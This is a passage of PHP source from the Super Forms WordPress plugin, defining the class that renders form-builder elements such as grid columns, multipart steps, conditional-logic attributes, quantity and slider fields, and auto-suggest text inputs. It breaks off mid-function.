<?php
/**
 * Super Forms Common Class.
 *
 * @author      feeling4design
 * @category    Class
 * @package     SUPER_Forms/Classes
 * @class       SUPER_Shortcodes
 * @version     1.0.0
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly
}

if( !class_exists( 'SUPER_Shortcodes' ) ) :

/**
 * SUPER_Shortcodes
 */
class SUPER_Shortcodes {
        
    /** 
     *  All the fields
     *
     *  Create an array with all the fields
     *
     *  @since      1.0.0
    */
    public static function shortcodes( $shortcode=false, $attributes=false, $content=false ) {
        
        $attributes = stripslashes_deep($attributes);

        $attr = array( 
            'shortcode'=>$shortcode, 
            'attributes'=>$attributes, 
            'content'=>$content 
        );
            
        include( 'shortcodes/predefined-arrays.php' );
        
        $array = array();
        
        $array = apply_filters( 'super_shortcodes_start_filter', $array, $attr );
        
        /** 
         *  Layout Elements
         *
         *  @since      1.0.0
        */
        include( 'shortcodes/layout-elements.php' );
        $array = apply_filters( 'super_shortcodes_after_layout_elements_filter', $array, $attr );

        
        /** 
         *  Form Elements
         *
         *  @since      1.0.0
        */
        include( 'shortcodes/form-elements.php' );
        $array = apply_filters( 'super_shortcodes_after_form_elements_filter', $array, $attr );
        
        
        /** 
         *  Price Elements
         *
         *  @since      1.0.0
        */
        include( 'shortcodes/price-elements.php' );
        $array = apply_filters( 'super_shortcodes_after_price_elements_filter', $array, $attr );
        
        $array = apply_filters( 'super_shortcodes_end_filter', $array, $attr );

        return $array;
        
    }
    
    /** 
     *  Output the element HTML on the builder page (create form) inside the preview area
     *
     * @param  string  $tag
     *
     *  @since      1.0.0
    */
    public static function output_builder_html( $tag, $group, $data, $inner, $shortcodes=null, $settings=null ) {
        
        if( $shortcodes==null ) {
            $shortcodes = self::shortcodes();
        }

        if( !isset( $shortcodes[$group]['shortcodes'][$tag] ) ) {
            return '';
        }

        $name = $shortcodes[$group]['shortcodes'][$tag]['name'];

        if(count($data)==0){
            $fields = array();
            foreach( $shortcodes[$group]['shortcodes'][$tag]['atts'] as $k => $v ) {
                if( isset( $v['fields'] ) ) {
                    foreach( $v['fields'] as $vk => $vv ) {
                        if( ($vv['default']!=='') && ($vv['default']!==0) ) {
                            $fields[$vk] = $vv['default'];
                        }
                    }
                }
            }
            $data = $fields;
        }else{
            $data = $data;
        }

        $data = json_decode(json_encode($data), true);
        $inner = json_decode(json_encode($inner), true);
   
        $class = '';
        $inner_class = '';

        if($tag=='column'){
            $sizes = array(
                '1/5'=>array('one_fifth',20),
                '1/4'=>array('one_fourth',25),
                '1/3'=>array('one_third',33.3333334),
                '2/5'=>array('two_fifth',40),
                '1/2'=>array('one_half',50),
                '3/5'=>array('three_fifth',60),
                '2/3'=>array('two_third',66.6666667),
                '3/4'=>array('three_fourth',75),
                '4/5'=>array('four_fifth',80),
                '1/1'=>array('one_full',100),
            ); 
            $class .= ' super_'.$sizes[$data['size']][0] . ' super-' . str_replace( 'column_', 'super_', $tag );
        }
        if($tag=='multipart'){
            $class .= ' ' . $tag;
        }
  
        if( isset( $shortcodes[$group]['shortcodes'][$tag]['drop'] ) ) {
            $class .= ' drop-here';
            $inner_class .= ' super-dropable';
        }
        
        if( !isset( $data['minimized'] ) ) $data['minimized'] = 'no';
        if($data['minimized']=='yes'){
            $class .= ' super-minimized';
        }
        $result = '';
        $result .= '<div class="super-element' . $class . '" data-shortcode-tag="' . $tag . '" data-group="'.$group.'" data-minimized="' . $data['minimized'] . '" ' . ( $tag=='column' ? 'data-size="' . $data['size'] . '"' : '' ) . '>';
            $result .= '<div class="super-element-header">';
                if( ($tag=='column') || ($tag=='multipart') ){
                    $result .= '<div class="super-element-label">';
                    if(!isset($data['label'])) $data['label'] = $name;
                    $result .= '<span>'.$data['label'].'</span>';
                    $result .= '<input type="text" value="'.$data['label'].'" />';
                    $result .= '</div>';
                }
                if($tag=='column'){
                    $result .= '<div class="resize popup" data-content="Change Column Size">';
                        $result .= '<span class="smaller"><i class="fa fa-angle-left"></i></span>';
                        $result .= '<span class="current">' . $data['size'] . '</span><span class="bigger"><i class="fa fa-angle-right"></i></span>';
                    $result .= '</div>';
                }else{
                    $result .= '<div class="super-title">' . $name . '</div>';
                }
                $result .= '<div class="super-element-actions">';
                    $result .= '<span class="edit popup" title="Edit element"><i class="fa fa-pencil"></i></span>';
                    $result .= '<span class="duplicate popup" title="Duplicate element"><i class="fa fa-files-o"></i></span>';
                    $result .= '<span class="move popup" title="Reposition element"><i class="fa fa-arrows"></i></span>';
                    $result .= '<span class="minimize popup" title="Minimize"><i class="fa fa-minus-square-o"></i></span>';
                    $result .= '<span class="delete popup" title="Delete"><i class="fa fa-times"></i></span>';
                $result .= '</div>';
            $result .= '</div>';
            $result .= '<div class="super-element-inner' . $inner_class . '">';
                if( ( $tag!='column' ) && ( $tag!='multipart' ) ) {
                    $result .= self::output_element_html( $tag, $group, $data, $inner, $shortcodes, $settings );
                }
                if( !empty( $inner ) ) {
                    foreach( $inner as $k => $v ) {
                        $result .= self::output_builder_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
                    }
                }
            $result .= '</div>';
            $result .= '<textarea name="element-data">' . json_encode( $data ) . '</textarea>';
        $result .= '</div>';
        
        return $result;
        
    }

    public static function opening_tag( $tag, $atts, $class='', $styles='' ) {        
        $style = '';
        if($tag=='divider') $atts['width'] = 0;
        if( !isset( $atts['width'] ) ) $atts['width'] = 0;
        if( $atts['width']!=0 ) $style .= 'width:' . $atts['width'] . 'px;';
        if( !empty( $atts['tooltip'] ) ) {
            wp_enqueue_style('super-tooltips', SUPER_PLUGIN_FILE.'assets/css/backend/tooltips.min.css', array(), SUPER_VERSION);    
            wp_enqueue_script('super-tooltips', SUPER_PLUGIN_FILE.'assets/js/backend/tooltips.min.js', array(), SUPER_VERSION);   
        }
        $result = '<div';
        if( ( $style!='' ) || ( $styles!='' ) ) $result .= ' style="' . $style . $styles . '"';
        $result .= ' class="super-shortcode super-field super-' . $tag;

        $align = '';
        if( isset( $atts['align'] ) ) $align = ' super-align-' . $atts['align'];
        $result .= $align;

        if( !empty( $atts['tooltip'] ) ) $result .= ' popup';
        if( !isset( $atts['error_position'] ) ) $atts['error_position'] = '';
        $result .= ' ' . $atts['error_position'];
        //if(($tag=='super_checkbox') || ($tag=='super_radio') || ($tag=='super_shipping')) $result .= ' display-'.$display;
        if( !isset( $atts['grouped'] ) ) $atts['grouped'] = 0;
        if($atts['grouped']==0) $result .= ' ungrouped ';
        if($atts['grouped']==1) $result .= ' grouped ';
        if($atts['grouped']==2) $result .= ' grouped grouped-end ';
        $result .= ' ' . $class . '"';
        if( !empty( $atts['tooltip'] ) ) $result .= ' title="' . esc_attr( stripslashes( $atts['tooltip'] ) ) . '"';
        if( $tag=='hidden' ) {
            $result .= self::conditional_variable_attributes( $atts );
        }else{
            $result .= self::conditional_attributes( $atts );
        }
        $result .= '>';
        if( !isset( $atts['label'] ) ) $atts['label'] = '';
        if( $atts['label']!='' ) {
            $bottom_margin = false;
            if( $atts['description']=='' ) {
                $bottom_margin = true;
            }
            $result .= self::field_label( $atts['label'], $bottom_margin );
        }
        if( !isset( $atts['description'] ) ) $atts['description'] = '';
        if( $atts['description']!='' ) {
            $result .= self::field_description( $atts['description'] );
        }
        return $result;
    }
    public static function conditional_attributes( $atts ) {        
        if( !isset( $atts['conditional_action'] ) ) $atts['conditional_action'] = 'disabled';
        if( !isset( $atts['conditional_trigger'] ) ) $atts['conditional_trigger'] = 'all';
        if( $atts['conditional_action']!='disabled' ) {
            return ' data-conditional_action="' . $atts['conditional_action'] . '" data-conditional_trigger="' . $atts['conditional_trigger'] . '"';
        }
    }
    public static function conditional_variable_attributes( $atts ) {        
        if( !isset( $atts['conditional_variable_action'] ) ) $atts['conditional_variable_action'] = 'disabled';
        if( $atts['conditional_variable_action']!='disabled' ) {
            return ' data-conditional_variable_action="' . $atts['conditional_variable_action'] . '"';
        }
    }
    public static function field_label( $label, $bottom_margin ) {        
        $class = '';
        if( $bottom_margin==true ) $class = ' super-bottom-margin';
        return '<div class="super-label' . $class . '">' . $label . '</div>';
    }
    public static function field_description( $description ) {        
        return '<div class="super-description">' . $description . '</div>';
    }        
    public static function opening_wrapper( $atts=array(), $inner=array(), $shortcodes=null, $settings=null ) {
        if( !isset( $atts['icon'] ) ) $atts['icon'] = '';
        if( !isset( $atts['icon_position'] ) ) $atts['icon_position'] = 'outside';
        if( !isset( $atts['icon_align'] ) ) $atts['icon_align'] = 'left';
        if( !isset( $atts['wrapper_width'] ) ) $atts['wrapper_width'] = '';
        $style = '';
        if( !isset( $atts['wrapper_width'] ) ) $atts['wrapper_width'] = 0;
        if( $atts['wrapper_width']!=0 ) {
            $style = 'width:' . $atts['wrapper_width'] . 'px;';
        }
        if( !empty( $style ) ) {
            $style = ' style="' . $style . '"';
        }
        if( ( isset( $settings['theme_hide_icons'] ) ) && ( $settings['theme_hide_icons']=='yes' ) ) {
            $atts['icon'] = '';
        }
        $result = '<div' . $style . ' class="super-field-wrapper ' . ( $atts['icon']!='' ? 'super-icon-' . $atts['icon_position'] . ' super-icon-' . $atts['icon_align'] : '' ) . '">';
        if($atts['icon']!=''){
            $result .= '<i class="fa fa-'.$atts['icon'].' super-icon"></i>';
        }
        return $result;
    }
    public static function common_attributes( $atts, $tag ) {        
        if( !isset( $atts['error'] ) ) $atts['error'] = '';
        if( !isset( $atts['validation'] ) ) $atts['validation'] = '';
        if( !isset( $atts['conditional_validation'] ) ) $atts['conditional_validation'] = '';
        if( !isset( $atts['conditional_validation_value'] ) ) $atts['conditional_validation_value'] = '';
        if( !isset( $atts['may_be_empty'] ) ) $atts['may_be_empty'] = 'false';
        if( !isset( $atts['email'] ) ) $atts['email'] = '';
        if( !isset( $atts['exclude'] ) ) $atts['exclude'] = 0;
        if( !isset( $atts['maxlength'] ) ) $atts['maxlength'] = 0;
        if( !isset( $atts['minlength'] ) ) $atts['minlength'] = 0;
        $result = ' data-message="' . $atts['error'] . '" data-validation="'.$atts['validation'].'" data-may-be-empty="'.$atts['may_be_empty'].'" data-conditional-validation="'.$atts['conditional_validation'].'" data-conditional-validation-value="'.$atts['conditional_validation_value'].'" data-email="'.$atts['email'].'" data-exclude="'.$atts['exclude'].'"';
        
        // disabled     @ since v1.2.2
        if( !isset( $atts['disabled'] ) ) $atts['disabled'] = ''; 
        if( !empty( $atts['disabled'] ) ) $result .= ' disabled="' . $atts['disabled'] . '"';

        if( !empty( $atts['placeholder'] ) ) {
            $result .= ' placeholder="' . $atts['placeholder'] . '"';
        }
        if($tag=='file'){
            if( $atts['minlength']>0 ) {
                $result .= ' data-minfiles="' . $atts['minlength'] . '"';
            }
            if( $atts['maxlength']>0 ) {
                $result .= ' data-maxfiles="' . $atts['maxlength'] . '"';
            }
        }elseif( $tag=='product' ) {
            if( $atts['maxlength']>0 ) {
                $result .= ' max="' . $atts['maxlength'] . '" data-maxlength="' . $atts['maxlength'] . '"';
            }
            $result .= ' min="' . $atts['minlength'] . '" data-minlength="' . $atts['minlength'] . '"';
        }elseif( ($tag=='dropdown') || ($tag=='checkbox') || ($tag=='radio') ) {
            // @since 1.2.7
            if( !isset( $atts['admin_email_value'] ) ) $atts['admin_email_value'] = 'value';
            if( !isset( $atts['confirm_email_value'] ) ) $atts['confirm_email_value'] = 'value';
            $result .= ' data-admin-email-value="' . $atts['admin_email_value'] . '"';
            $result .= ' data-confirm-email-value="' . $atts['confirm_email_value'] . '"';
        }else{
            if($tag=='date'){
                if( $atts['maxlength']!='' ) {
                    $result .= ' data-maxlength="' . $atts['maxlength'] . '"';
                }
                if( $atts['minlength']!='' ) {
                    $result .= ' data-minlength="' . $atts['minlength'] . '"';
                }
            }else{
                if( $atts['maxlength']>0 ) {
                    $result .= ' data-maxlength="' . $atts['maxlength'] . '"';
                }
                if( $atts['minlength']>0 ) {
                    $result .= ' data-minlength="' . $atts['minlength'] . '"';
                }
            }

            if( !isset( $atts['maxnumber'] ) ) $atts['maxnumber'] = 0;
            if( !isset( $atts['minnumber'] ) ) $atts['minnumber'] = 0;
            if( $atts['maxnumber']>0 ) {
                $result .= ' data-maxnumber="' . $atts['maxnumber'] . '"';
            }
            if( $atts['minnumber']>0 ) {
                $result .= ' data-minnumber="' . $atts['minnumber'] . '"';
            }
        }

        // @since 1.2.7     - super_common_attributes_filter
        return apply_filters( 'super_common_attributes_filter', $result, array( 'atts'=>$atts, 'tag'=>$tag ) );

    }

    // @since 1.2.5     - custom regex validation
    public static function custom_regex( $regex ) {
        return '<textarea disabled class="super-custom-regex">' . $regex . '</textarea>';
    }

    public static function loop_conditions( $atts ) {
        if( !isset( $atts['conditional_action'] ) ) $atts['conditional_action'] = 'disabled';
        if( !isset( $atts['conditional_items'] ) ) $atts['conditional_items'] = '';
        if( ( $atts['conditional_items']!=null ) && ( $atts['conditional_action']!='disabled' ) ) {
            $items = '';
            foreach( $atts['conditional_items'] as $k => $v ) {
                
                // @since 1.2.2
                if( !isset( $v['and_method'] ) ) $v['and_method'] = '';
                if( !isset( $v['field_and'] ) ) $v['field_and'] = '';
                if( !isset( $v['logic_and'] ) ) $v['logic_and'] = '';
                if( !isset( $v['value_and'] ) ) $v['value_and'] = '';

                $items .= '<div hidden class="super-conditional-logic" data-field="' . $v['field'] . '" data-logic="' . $v['logic'] . '" data-value="' . $v['value'] . '" data-and-method="' . $v['and_method'] . '" data-field-and="' . $v['field_and'] . '" data-logic-and="' . $v['logic_and'] . '" data-value-and="' . $v['value_and'] . '"></div>';
            }
            return $items;
        }
    }
    
    // @since 1.2.7    - variable conditions
    public static function loop_variable_conditions( $atts ) {
        if( !isset( $atts['conditional_variable_action'] ) ) $atts['conditional_variable_action'] = 'disabled';
        if( !isset( $atts['conditional_items'] ) ) $atts['conditional_items'] = '';
        if( ( $atts['conditional_items']!=null ) && ( $atts['conditional_variable_action']!='disabled' ) ) {
            $items = '';
            foreach( $atts['conditional_items'] as $k => $v ) {
                
                // @since 1.2.2
                if( !isset( $v['and_method'] ) ) $v['and_method'] = '';
                if( !isset( $v['field_and'] ) ) $v['field_and'] = '';
                if( !isset( $v['logic_and'] ) ) $v['logic_and'] = '';
                if( !isset( $v['value_and'] ) ) $v['value_and'] = '';
                if( !isset( $v['new_value'] ) ) $v['new_value'] = '';

                $items .= '<div hidden class="super-variable-condition" data-field="' . $v['field'] . '" data-logic="' . $v['logic'] . '" data-value="' . $v['value'] . '" data-and-method="' . $v['and_method'] . '" data-field-and="' . $v['field_and'] . '" data-logic-and="' . $v['logic_and'] . '" data-value-and="' . $v['value_and'] . '" data-new-value="' . $v['new_value'] . '"></div>';
            }
            return $items;
        }
    }

    /** 
     *  Callback functions for each element to output the HTML
     *
     * @param  string  $tag
     * @param  string  $group
     * @param  array   $data
     *
     *  @since      1.0.0
    */
    public static function multipart( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        
        // @since 1.2.3
        if( !isset( $atts['auto'] ) ) $atts['auto'] = 'no';

        $result  = '';
        $result .= '<div class="super-shortcode super-' . $tag . '" data-step-auto="' . $atts['auto'] .'" data-step-name="' . $atts['step_name'] .'" data-step-description="' . $atts['step_description'] . '"';
        
        // @since 1.2.5
        if( isset( $atts['prev_text'] ) ) $result .= ' data-prev-text="' . $atts['prev_text'] . '"';
        if( isset( $atts['next_text'] ) ) $result .= ' data-next-text="' . $atts['next_text'] . '"';
        
        $result .= ' data-icon="' . $atts['icon'] . '">';
        if( !empty( $inner ) ) {
            // Before doing the actuall loop we need to know how many columns this form contains
            // This way we can make sure to correctly close the column system
            $GLOBALS['super_column_found'] = 0;
            foreach( $inner as $k => $v ) {
                if( $v['tag']=='column' ) $GLOBALS['super_column_found']++;
            }
            foreach( $inner as $k => $v ) {
                $result .= self::output_element_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
            }
        }
        unset($GLOBALS['super_grid_system']);
        $result .= '</div>';
        return $result;
    }
    public static function column( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result  = '';
        $sizes = array(
            '1/5'=>array('one_fifth',20),
            '1/4'=>array('one_fourth',25),
            '1/3'=>array('one_third',33.3333334),
            '2/5'=>array('two_fifth',40),
            '1/2'=>array('one_half',50),
            '3/5'=>array('three_fifth',60),
            '2/3'=>array('two_third',66.6666667),
            '3/4'=>array('three_fourth',75),
            '4/5'=>array('four_fifth',80),
            '1/1'=>array('one_full',100),
        );

        // @since   1.1.7    - make sure this data is set
        if( !isset( $atts['duplicate'] ) ) $atts['duplicate'] = '';

        // @since   1.2.2    - make sure this data is set
        if( !isset( $atts['invisible'] ) ) $atts['invisible'] = '';
        if($atts['invisible']=='true') $atts['invisible'] = ' super-invisible';

        // Make sure our global super_grid_system is set
        if( !isset( $GLOBALS['super_grid_system'] ) ) {
            $GLOBALS['super_grid_system'] = array(
                'level' => 0,
                'width' => 0,
                'columns' => array()
            );
        }
        $grid = $GLOBALS['super_grid_system'];
        if( $grid['level']==0 ) {
            if( !isset( $GLOBALS['super_column_found'] ) ) $GLOBALS['super_column_found'] = 0;
            if( !isset( $grid['columns'][$grid['level']]['total'] ) ) $GLOBALS['super_grid_system']['columns'][$grid['level']]['total'] = $GLOBALS['super_column_found'];
        }
        if( !isset( $grid['columns'][$grid['level']]['current'] ) ) $GLOBALS['super_grid_system']['columns'][$grid['level']]['current'] = 0;
        if( !isset( $grid[$grid['level']]['width'] ) ) $GLOBALS['super_grid_system'][$grid['level']]['width'] = 0;
        if( !isset( $grid[$grid['level']]['opened'] ) ) $GLOBALS['super_grid_system'][$grid['level']]['opened'] = 0;
        if( !isset( $grid[$grid['level']]['closed'] ) ) $GLOBALS['super_grid_system'][$grid['level']]['closed'] = 0;

        // Before setting the global grid system variable count the inner columns
        if( !isset( $grid['columns'][$grid['level']]['inner_total'] ) ) {
            $inner_total = 0;
            if( !empty( $inner ) ) {
                foreach( $inner as $k => $v ) {
                    if( $v['tag']=='column' ) $inner_total++;
                }
            }
            $GLOBALS['super_grid_system']['columns'][$grid['level']]['inner_total'] = $inner_total;
        }
        $grid = $GLOBALS['super_grid_system'];

        // This is the first column of the grid
        $grid['columns'][$grid['level']]['current']++;
        if( $grid['columns'][$grid['level']]['current']==1 ) {
            
            $result .= '<div class="super-grid super-shortcode">';
            $grid[$grid['level']]['opened']++;
            $grid[$grid['level']]['width'] = floor($grid[$grid['level']]['width']+$sizes[$atts['size']][1]);
            
            // Output the column and it's inner content
            $class = 'first-column';
            $result .= '<div class="super-shortcode super_' . $sizes[$atts['size']][0] . ' super-column'.$atts['invisible'].' column-number-'.$grid['columns'][$grid['level']]['current'].' grid-level-'.$grid['level'].' ' . $class . ' ' . $atts['margin'] . '"'; 
            $result .= self::conditional_attributes( $atts );

            if( $atts['duplicate']=='enabled' ) {
                // @since   1.2.8    - make sure this data is set
                if( !isset( $atts['duplicate_limit'] ) ) $atts['duplicate_limit'] = 0;
                $result .= ' data-duplicate_limit="' . $atts['duplicate_limit'] . '"';
            }

            $result .= '>';
            if( !empty( $inner ) ) {
                if( $atts['duplicate']=='enabled' ) {
                    $result .= '<div class="super-shortcode super-duplicate-column-fields">';
                }
                $grid['level']++;
                $GLOBALS['super_grid_system'] = $grid;
                foreach( $inner as $k => $v ) {
                    $result .= self::output_element_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
                }
                if( $atts['duplicate']=='enabled' ) {
                    $result .= '<div class="super-duplicate-actions">';
                    $result .= '<span class="super-add-duplicate"></span>';
                    $result .= '<span class="super-delete-duplicate"></span>';
                    $result .= '</div>';
                    $result .= '</div>';
                }
                $grid['level']--;
                $GLOBALS['super_grid_system'] = $grid;      
            }
            $result .= self::loop_conditions( $atts );
            $result .= '</div>';

            if( $sizes[$atts['size']][1]==100 ) {
                $grid['columns'][$grid['level']]['current'] = 0;
                $grid[$grid['level']]['width'] = 0;
                $result .= '</div>';
                $grid[$grid['level']]['closed']++;
                if( $grid['level']==0 ) {
                    $unset_global = true;
                }
            }
            $GLOBALS['super_grid_system'] = $grid;
            
        }else{

            $class = '';
            if( ($grid[$grid['level']]['width']<100) && (floor($grid[$grid['level']]['width']+$sizes[$atts['size']][1])>100) ) {
                $grid[$grid['level']]['width'] = 0;
                $result .= '</div>';
                $grid[$grid['level']]['closed']++;

                $result .= '<div class="super-grid super-shortcode">';
                $grid['columns'][$grid['level']]['current'] = 1;
                $class = 'first-column';

                $grid[$grid['level']]['opened']++;
            }

            $grid[$grid['level']]['width'] = floor($grid[$grid['level']]['width']+$sizes[$atts['size']][1]);
            
            // Output the column and it's inner content
            $result .= '<div class="super-shortcode super_' . $sizes[$atts['size']][0] . ' super-column'.$atts['invisible'].' column-number-'.$grid['columns'][$grid['level']]['current'].' grid-level-'.$grid['level'].' ' . $class . ' ' . $atts['margin'] . '"'; 
            $result .= self::conditional_attributes( $atts );
            $result .= '>';
            if( !empty( $inner ) ) {
                if( $atts['duplicate']=='enabled' ) {
                    $result .= '<div class="super-shortcode super-duplicate-column-fields">';
                }
                $grid['level']++;
                $GLOBALS['super_grid_system'] = $grid;
                foreach( $inner as $k => $v ) {
                    $result .= self::output_element_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
                }
                if( $atts['duplicate']=='enabled' ) {
                    $result .= '<div class="super-duplicate-actions">';
                    $result .= '<span class="super-add-duplicate"></span>';
                    $result .= '<span class="super-delete-duplicate"></span>';
                    $result .= '</div>';
                    $result .= '</div>';
                }
                $grid['level']--;
                $GLOBALS['super_grid_system'] = $grid;
            }
            $result .= self::loop_conditions( $atts );
            $result .= '</div>';

            if( ( $sizes[$atts['size']][1]==100 ) || ( $grid[$grid['level']]['width']>=95 ) ) {
                $grid['columns'][$grid['level']]['current'] = 0;
                $grid[$grid['level']]['width'] = 0;
                $result .= '</div>';
                $grid[$grid['level']]['closed']++;
            }
            $GLOBALS['super_grid_system'] = $grid;
        }

        // Before returning the result, make sure we check for missing closures of the grid
        if( isset($grid['columns'][$grid['level']]['total']) ) {
            if( $grid['columns'][$grid['level']]['total']==$grid['columns'][$grid['level']]['current'] ) {
                if( $grid[$grid['level']]['closed'] < $grid[$grid['level']]['opened'] ) {
                    $result .= '</div>';
                }
            }
        }else{
            $level = $grid['level']-1;
            if( $grid['columns'][$level]['inner_total']==$grid['columns'][$grid['level']]['current'] ) {
                if( $grid[$grid['level']]['closed'] < $grid[$grid['level']]['opened'] ) {
                    $result .= '</div>';
                }
            }
        }
        if( isset( $unset_global ) ) {
            if( $unset_global==true ) {
                unset($GLOBALS['super_grid_system']);
            }
        }
        return $result;

    }

    /** 
     *  Quantity field
     *
     * @param  string  $tag
     * @param  array  $atts
     *
     *  @since      1.2.1
    */    
    public static function quantity_field( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $atts['validation'] = 'numeric';
        if( (!isset($atts['wrapper_width'])) || ($atts['wrapper_width']==0) ) $atts['wrapper_width'] = 50;
        $result = self::opening_tag( $tag, $atts );
        $result .= '<span class="super-minus-button super-noselect"><i>-</i></span>';
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<input class="super-shortcode-field" type="text"';
        if( isset( $_GET[$atts['name']] ) )  $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        if( ( !isset( $atts['value'] ) ) || ( $atts['value']=='' ) ) $atts['value'] = '';
        if( ( !isset( $atts['minnumber'] ) ) || ( $atts['minnumber']=='' ) ) $atts['minnumber'] = 0;
        if( ( !isset( $atts['maxnumber'] ) ) || ( $atts['maxnumber']=='' ) ) $atts['maxnumber'] = 100;
        $result .= ' name="' . $atts['name'] . '" value="' . $atts['value'] . '" data-steps="' . $atts['steps'] . '" data-minnumber="' . $atts['minnumber'] . '" data-maxnumber="' . $atts['maxnumber'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= '<span class="super-plus-button super-noselect"><i>+</i></span>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    /** 
     *  Slider element
     *
     * @param  string  $tag
     * @param  array  $atts
     *
     *  @since      1.2.1
    */    
    public static function slider_field( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        wp_enqueue_style('super-simpleslider', SUPER_PLUGIN_FILE.'assets/css/backend/simpleslider.min.css', array(), SUPER_VERSION);    
        wp_enqueue_script('super-simpleslider', SUPER_PLUGIN_FILE.'assets/js/backend/simpleslider.min.js', array(), SUPER_VERSION); 
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<input class="super-shortcode-field" type="text"';
        if( isset( $_GET[$atts['name']] ) )  $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        if( ( !isset( $atts['value'] ) ) || ( $atts['value']=='' ) ) $atts['value'] = '';
        if( ( !isset( $atts['minnumber'] ) ) || ( $atts['minnumber']=='' ) ) $atts['minnumber'] = 0;
        if( ( !isset( $atts['maxnumber'] ) ) || ( $atts['maxnumber']=='' ) ) $atts['maxnumber'] = 100;
        
        if( !isset( $atts['format'] ) ) $atts['format'] = '';

        // @since 1.2.2
        if( !isset( $atts['currency'] ) ) $atts['currency'] = '';
        if( !isset( $atts['decimals'] ) ) $atts['decimals'] = 2;
        if( !isset( $atts['thousand_separator'] ) ) $atts['thousand_separator'] = ',';
        if( !isset( $atts['decimal_separator'] ) ) $atts['decimal_separator'] = '.';

        $result .= ' name="' . $atts['name'] . '" value="' . $atts['value'] . '" data-decimals="' . $atts['decimals'] . '" data-thousand-separator="' . $atts['thousand_separator'] . '" data-decimal-separator="' . $atts['decimal_separator'] . '" data-steps="' . $atts['steps'] . '" data-currency="' . $atts['currency'] . '" data-format="' . $atts['format'] . '" data-minnumber="' . $atts['minnumber'] . '" data-maxnumber="' . $atts['maxnumber'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    public static function text( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        
        // @since   1.2.4   - auto suggest feature
        if( !isset( $atts['enable_auto_suggest'] ) ) $atts['enable_auto_suggest'] = '';
        $class = ($atts['enable_auto_suggest']=='true' ? 'super-auto-suggest' : '');

        $result = self::opening_tag( $tag, $atts, $class );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        
        $result .= '<input class="super-shortcode-field" type="text"';

        // @since   1.1.8   - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }

        // @since   1.0.6   - make sure this data is set
        if( ( !isset( $atts['value'] ) ) || ( $atts['value']=='' ) ) {
            $atts['value'] = '';
        }else{
            $atts['value'] = SUPER_Common::email_tags( $atts['value'] );
        }

        if( $atts['enable_auto_suggest']=='true' ) {
            $items = array();
            if( !isset( $atts['retrieve_method'] ) ) $atts['retrieve_method'] = 'custom';
            if( $atts['retrieve_method']=='custom' ) {
                if( ( isset( $atts['autosuggest_items'] ) ) && ( count($atts['autosuggest_items'])!=0 ) && ( $atts['autosuggest_items']!='' ) ) {
                    foreach( $atts['autosuggest_items'] as $k => $v ) {
                        if( $v['checked']=='true' ) {
                            $atts['value'] = $v['value'];
                            if( $placeholder=='' ) {
                                $placeholder .= $v['label'];
                            }else{
                                $placeholder .= ', ' . $v['label'];
                            }
                            $items[] = '<li data-value="' . esc_attr( $v['value'] ) . '" data-search-value="' . esc_attr( $v['label'] ) . '" class="selected">' . $v['label'] . '</li>'; 
                        }else{
                            $items[] = '<li data-value="' . esc_attr( $v['value'] ) . '" data-search-value="' . esc_attr( $v['label'] ) . '">' . $v['label'] . '</li>'; 
                        }
                    }
                }
            }      
            if($atts['retrieve_method']=='taxonomy') {
                if( !isset( $atts['retrieve_method_taxonomy'] ) ) $atts['retrieve_method_taxonomy'] = 'category';
                if( !isset( $atts['retrieve_method_exclude_taxonomy'] ) ) $atts['retrieve_method_exclude_taxonomy'] = '';
                if( !isset( $atts['retrieve_method_hide_empty'] ) ) $atts['retrieve_method_hide_empty'] = 0;
                if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
                
                $args = array(
                    'hide_empty' => $atts['retrieve_method_hide_empty'],
                    'exclude' => $atts['retrieve_method_exclude_taxonomy'],
                    'taxonomy' => $atts['retrieve_method_taxonomy'],
                    'parent' => $atts['retrieve_method_parent'],
                );
                $categories = get_categories( $args );
                foreach( $categories as $v ) {
                    
                    // @since 1.2.5
                    if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                    if($atts['retrieve_method_value']=='slug'){
                        $data_value = $v->slug;
                    }elseif($atts['retrieve_method_value']=='id'){
                        $data_value = $v->ID;
                    }else{
                        $data_value = $v->name;
                    }
                    $items[] = '<li data-value="' . esc_attr($data_value) . '" data-search-value="' . esc_attr( $v->name ) . '">' . $v->name . '</li>'; 
                }
            }
            // @since   1.2.4
            if($atts['retrieve_method']=='post_type') {
                if( !isset( $atts['retrieve_method_post'] ) ) $atts['retrieve_method_post'] = 'post';
                if( !isset( $atts['retrieve_method_exclude_post'] ) ) $atts['retrieve_method_exclude_post'] = '';
                if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
                $args = array(
                    'post_type' => $atts['retrieve_method_post'],
                    'exclude' => $atts['retrieve_method_exclude_post'],
